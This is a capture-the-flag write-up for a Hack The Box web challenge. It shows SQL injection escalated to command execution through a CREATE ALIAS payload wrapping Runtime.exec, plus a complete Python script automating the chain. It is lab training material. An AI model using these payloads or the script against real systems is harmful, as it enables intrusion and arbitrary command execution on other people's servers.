# Pentest Notes - HTB Challenge Writeup
## Reconnaissance / Information Gathering
We start the challenge and we are given a host to connect to via our web browser:
![[Pasted image 20250505072550.png]]

Upon going to the host, we are greeted with a login page to login or register:
![[Pasted image 20250505072633.png]]

Creating an account, we can see a checklist called 'PENTEST CHECKLIST':
![[Pasted image 20250505072722.png]]

Clicking on the SQL Injection note, we see a comment that says `One ' to rule them all`. This hints at SQLi, so we start probing the website and messing with the URL with a `'` to test for SQLi.
## Exploitation: SQLi
After adding our payload to the end of the URL, we can find some output when we use 3 `NULL`s, which indicates the notes have 3 columns.

We also determine that the first column is not a string, but the second and third (Name and Note) columns are strings. We can determine this by replacing `NULL` with `a` for the `NULL` value:
![[Pasted image 20250505075257.png]]

We list all the databases with: `' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata--`
![[Pasted image 20250505075946.png]]

We have 2 databases: 
1. INFORMATION_SCHEMA
2. PUBLIC

We query the `INFORMATION_SCHEMA` database to list all the tables, and see a table called `USERS`. We query the table to see all the columns, then get all the users usernames and passwords in the table:
![[Pasted image 20250505081303.png]]

If we login as `user` with password `123`, we just get to the same page with the same PENTEST CHECKLIST.

I continued to search through all the tables, but couldn't find anything useful. I decided to capture requests in Burp Suite to see what I could find through there.

We capture a request in Burp Suite when re-loading the page to find a POST request being sent to /api/note:
![[Pasted image 20250505094118.png]]

Here we find we can also submit the SQL injection through the name of the request (after `SQL Injection`):
![[Pasted image 20250505094359.png]]

Since we already went through all the tables and couldn't find anything, we can try to get command injection through the following payload:
![[Pasted image 20250505094518.png]]
This command does the following:
- Ends the current SQL command.
- Creates a Java-based SQL function named `EXE_CMD` that can run any system command.
- Comments out the rest of the original SQL query to avoid syntax errors.

Now we can execute commands with the following payload:
![[Pasted image 20250505094753.png]]

We traverse through the file system and find a file that contains the flag:
![[Pasted image 20250505100141.png]]
# Automation with Python
Script created to automate the challenge:
```python
import requests  # Used to make HTTP requests (GET, POST, etc.)
import re        # Used for regular expressions to search for patterns (e.g., the flag format)

# Base target URL (replace with the current HTB instance IP:PORT)
base_url = 'http://83.136.248.49:52176'

# Create a persistent session object to retain cookies and headers across requests
session = requests.Session()

# Step 1: LOGIN TO THE APPLICATION
# Construct the full login endpoint
login_url = f'{base_url}/login'

# Provide default credentials to log in
login_data = {
    'username': 'user',
    'password': '123'
}

# Set HTTP headers to mimic a normal browser request
login_headers = {
    'Content-Type': 'application/x-www-form-urlencoded',  # Form submission format
    'Origin': base_url,  # Helps prevent CSRF on some servers
    'Referer': f'{base_url}/login',  # Shows the source page of the request
    'User-Agent': 'Mozilla/5.0'  # Mimics a real browser to avoid being blocked
}

# Send POST request to login with the above data and headers
response = session.post(login_url, data=login_data, headers=login_headers)

# Check if session cookie (JSESSIONID) is set, which indicates a successful login
if 'JSESSIONID' not in session.cookies.get_dict():
    print("Login failed or session not set properly.")
    exit(1)  # Exit the script if login fails

print("Logged in successfully.")

# Step 2: CREATE A MALICIOUS SQL ALIAS 
# Payload to inject SQL that defines a new Java alias 'EXE_CMD' for executing system commands
alias_payload = (
    "------WebKitFormBoundaryPfGWWNBRSLYgbcBS\r\n"
    "Content-Disposition: form-data; name=\"name\"\r\n\r\n"
    "SQL Injection'; CREATE ALIAS EXE_CMD AS 'String exec(String cmd) throws Exception { "
    "Process p = Runtime.getRuntime().exec(cmd); java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter(\"\\\\A\"); "
    "return s.hasNext() ? s.next() : \"\";}' --\r\n"
    "------WebKitFormBoundaryPfGWWNBRSLYgbcBS--\r\n"
)

# Headers for sending multipart/form-data (needed for file/form uploads)
alias_headers = {
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryPfGWWNBRSLYgbcBS',
    'Origin': base_url,
    'Referer': f'{base_url}/note?name=SQL%20Injection',
    'User-Agent': 'Mozilla/5.0'
}

# Endpoint to create a note, which is being abused here for SQL injection
alias_url = f'{base_url}/api/note'

# Send malicious payload to the vulnerable endpoint to create the alias
response = session.post(alias_url, data=alias_payload, headers=alias_headers)
print("Alias payload sent.")

# Step 3: USE THE ALIAS TO EXECUTE A SYSTEM COMMAND
# This payload injects a UNION-based SQL query to call the EXE_CMD alias and read the flag file
exploit_payload = (
    "------WebKitFormBoundaryPfGWWNBRSLYgbcBS\r\n"
    "Content-Disposition: form-data; name=\"name\"\r\n\r\n"
    "SQL Injection' union select NULL,NULL,EXE_CMD('cat /JN8fe3XRqTYK_flag.txt') --\r\n"
    "------WebKitFormBoundaryPfGWWNBRSLYgbcBS--\r\n"
)

# Use same headers as above since we're still submitting multipart form data
exploit_headers = {
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryPfGWWNBRSLYgbcBS',
    'Origin': base_url,
    'Referer': f'{base_url}/note?name=SQL%20Injection',
    'User-Agent': 'Mozilla/5.0'
}

# Reuse the same endpoint to now exploit the alias and read the file
response = session.post(alias_url, data=exploit_payload, headers=exploit_headers)

# Step 4: SEARCH THE RESPONSE FOR THE FLAG
# Look for a flag matching HTB{...} format using regex
flag_match = re.search(r'HTB\{.*?\}', response.text)

# If found, print it; otherwise, show a failure message
if flag_match:
    print(f"Flag found: {flag_match.group(0)}")
else:
    print("Flag not found.")
```
- Logs into the target site and keeps the session alive using `requests.Session()`
- Submits a payload to create a Java alias function to execute OS commands
- Sends a second payload to trigger the alias and read the flag file
- Extracts and prints the flag

Result:
![[Pasted image 20250505103827.png]]